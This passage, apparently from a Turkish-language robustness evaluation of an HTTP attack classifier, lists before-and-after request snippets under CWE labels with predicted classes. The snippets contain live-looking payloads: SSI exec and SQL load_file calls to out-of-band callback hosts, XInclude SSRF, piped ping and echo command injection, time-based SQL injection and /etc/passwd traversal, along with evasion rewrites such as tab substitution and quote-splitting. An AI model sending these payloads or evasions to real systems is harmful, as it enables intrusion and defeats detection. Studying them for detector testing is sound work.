  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%27%22%60%27%22%2Fecqh31g2ei%2F%3E%3Cecqh31g2ei%2F%5C%3Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fn9i1d6ggd4%27%22%60%27%22%2Fn9i1d6ggd4%2F%3E%3Cn9i1d6ggd4%2F%2F%3Eydbzbraqt8%26%26f.sid%3D4533641686418468723%26bl%3Dboq_meetin`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Ey`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%27%22%60%27%22%2Fecqh31g2ei%2F%3E%3Cecqh31g2ei%2F%5C%3Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fn9i1d6ggd4%27%22%60%27%22%2Fn9i1d6ggd4%2F%3E%3Cn9i1d6ggd4%2F%2F%3Eydbzbraqt8%26%26f.sid%3D4533641686418468723%26bl%3Dboq_meetin`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `abled=0&datestamp=Mon+Jun+23+2025+12%3A34%3A25+GMT%2B0300+(Eastern+European+Summer+Time)&version=202505`
  - sonra: `abled=0&datestamp=Mon+Jun+23+2025+12%3A34%3A25+GMT+0300+(Eastern+European+Summer+Time)&version=202505`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `abled=0&datestamp=Mon+Jun+23+2025+12%3A34%3A25+GMT%2B0300+(Eastern+European+Summer+Time)&version=202505`
  - sonra: `abled=0&datestamp=Mon+Jun+23+2025+12%3A34%3A25+GMT+0300+(Eastern+European+Summer+Time)&version=202505`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%253A%252F%252Fsync.taboola.com%252Fsg%252Frtb-pubmatic-network%252F1%252Frtb-h%253Ftaboola_hm%253D%2523PMUID^1^0; pi=156307:2; KADUSERCOOKIE=2E89414B-7`
  - sonra: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%3A%2F%2Fsync.taboola.com%2Fsg%2Frtb-pubmatic-network%2F1%2Frtb-h%3Ftaboola_hm%3D%23PMUID^1^0; pi=156307:2; KADUSERCOOKIE=2E89414B-7`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%253A%252F%252Fsync.taboola.com%252Fsg%252Frtb-pubmatic-network%252F1%252Frtb-h%253Ftaboola_hm%253D%2523PMUID^1^0; pi=156307:2; KADUSERCOOKIE=2E89414B-7`
  - sonra: `07%26mpc%3D4%26fp%3D1%26pmc%3DPM_PMC%26pr%3Dhttps%3A%2F%2Fsync.taboola.com%2Fsg%2Frtb-pubmatic-network%2F1%2Frtb-h%3Ftaboola_hm%3D%23PMUID^1^0; pi=156307:2; KADUSERCOOKIE=2E89414B-7`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%2527%2522%60%2527%2522%2Fszg7uv9pjw%2F%253E%253Cszg7uv9pjw%2F%5C%253Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fs60zfpw2gt%252527%252522%252560%27%252522%252Fs60zfpw2gt%252F%25253E%25253Cs60zfpw2gt%252F%252F%25253Eun`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%27%22%60%27%22%2Fszg7uv9pjw%2F%3E%3Cszg7uv9pjw%2F%5C%3Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fs60zfpw2gt%27%22%60%27%22%2Fs60zfpw2gt%2F%3E%3Cs60zfpw2gt%2F%2F%3Eunh4dsm9se%26%26f.sid%3D699620121813095924%26bl%3Dboq_meeting`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%2527%2522%60%2527%2522%2Fszg7uv9pjw%2F%253E%253Cszg7uv9pjw%2F%5C%253Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fs60zfpw2gt%252527%252522%252560%27%252522%252Fs60zfpw2gt%252F%25253E%25253Cs60zfpw2gt%252F%252F%25253Eu`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%27%22%60%27%22%2Fszg7uv9pjw%2F%3E%3Cszg7uv9pjw%2F%5C%3Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fs60zfpw2gt%27%22%60%27%22%2Fs60zfpw2gt%2F%3E%3Cs60zfpw2gt%2F%2F%3Eunh4dsm9se%26%26f.sid%3D699620121813095924%26bl%3Dboq_meeting`

## combo

Varsayım: Kategoriye uygulanabilen tüm dönüşümler birlikte: artifact, sql_comment, html_slash, cmd_quote, path_dot, case, whitespace (çözücüye bağlı encoding_norm hariç).

- **126 - Path Traversal** (tahmin: 000 - Normal → 000 - Normal)
  - önce: `okie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z+s-T1QAMEVV45Z00C7C58T4|1750598511921&t:17505985119`
  - sonra: `okie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z%09s-T1QAMEVV45Z00C7C58T4|1750598511921&t:17505985119`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `GET /%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/index.php/my-account/edit-profile/%7B%7B%20attachment.thumbnail.url HTTP/1.1 Host: test-site`
  - sonra: `GET /%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd/index.php/my-account/edit-profile/%7B%7B%09attachment.thumbnail.url HTTP/1.1 Host: test-site`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `FyJtcb44dQ; A3=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22yd1%22%20value%3d%22xc0ft6gojp%22--%3e%3c!--%23set%20var%3d%220f3%22%20value%3d%22ze2hv8iqlr%22--%3e%3c!--%23echo%20var%3d%22yd1%22--%3e%3c!--%23echo%20var%3d%220f3%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.oastify.com%22%20--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFE`
  - sonra: `FyJtcb44dQ; A3=%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22yd1%22%09value%3d%22xc0ft6gojp%22--%3e%3c!--%23set%09var%3d%220f3%22%09value%3d%22ze2hv8iqlr%22--%3e%3c!--%23echo%09var%3d%22yd1%22--%3e%3c!--%23echo%09var%3d%220f3%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.cb-listener.net%22%09--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFE`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `GET /%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22550%22%20value%3d%2244zmld8vbw%22--%3e%3c!--%23set%20var%3d%22772%22%20value%3d%22661onfaxdy%22--%3e%3c!--%23echo%20var%3d%22550%22--%3e%3c!--%23echo%20var%3d%22772%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.oastify.com%22%20--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `GET /%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22550%22%09value%3d%2244zmld8vbw%22--%3e%3c!--%23set%09var%3d%22772%22%09value%3d%22661onfaxdy%22--%3e%3c!--%23echo%09var%3d%22550%22--%3e%3c!--%23echo%09var%3d%22772%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.cb-listener.net%22%09--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `GET /_/bscframe32108155'%20or%20'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
  - sonra: `GET /_/bscframe32108155'%09or%09'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `GET /_/bscframe32108155'%20or%20'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
  - sonra: `GET /_/bscframe32108155'%09or%09'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 94 - Code Injection)
  - önce: `l.com Accept-Language: en-US,en;q=0.5 Referer: (select load_file('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik6ft6hv.oastify.com\\gxx')) Upgrade-Insecure-Requests: 1 Sec-Fetch-`
  - sonra: `l.com Accept-Language: en-US,en;q=0.5 Referer: (SeLEcT load_file('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik6ft6hv.cb-listener.net\\gxx')) Upgrade-Insecure-Requests: 1 Sec-Fetch-`
- **66 - SQL Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `n;q=0.5 Referer: https://login.yahoo.com/')waitfor delay'0:0:20'-- Upgrade-Insecure-Requests: 1 Sec-F`
  - sonra: `n;q=0.5 Referer: https://login.yahoo.com/')waitfoR dElay'0:0:20'-- Upgrade-Insecure-Requests: 1 Sec-F`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
  - sonra: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CeCQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6Ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
  - sonra: `2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CecQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6gGd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/users/2 HTTP/1.1 User-Agent: Mozilla/5.`
  - sonra: `DELETE /api%7cp%22%22ing%09-n%0921%09127.0.0.1%7c%7c%60p%22%22ing%09-c%0921%09127.0.0.1%60%09%23'%09%7cp%22%22ing%09-n%0921%09127.0.0.1%7c%7c%60p%22%22ing%09-c%0921%09127.0.0.1%60%09%23%5c%22%09%7cp%22%22ing%09-n%0921%09127.0.0.1/users/2 HTTP/1.1 User-Agent: Mozilla/5.`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23'%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23%7c%22%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `DELETE /api/users%7ce%22%22cho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23'%09%7ce%22%22cho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23%7c%22%09%7ce%22%22cho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `DELETE /api/users/%3cadi%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs3trkj79vy.oastify.com/foo%22/%3e%3c/adi%3e HTTP/1.1 User-Agent: Mozill`
  - sonra: `DELETE /api/users/%3cadi%09xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%09href%3d%22http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs3trkj79vy.cb-listener.net/foo%22/%3e%3c/adi%3e HTTP/1.1 User-Agent: Mozill`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.oastify.com/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.cb-listener.net/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
  - sonra: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `ice%3D1%26_reqid%3D166653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 1Tgd%3ArNScwd%3BZGeKvd%3Arb5w8`
  - sonra: `ice%3D1%26_reqid%3D166653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 1Tgd%3ArNScwd%3BZGeKvd%3Arb5w8`

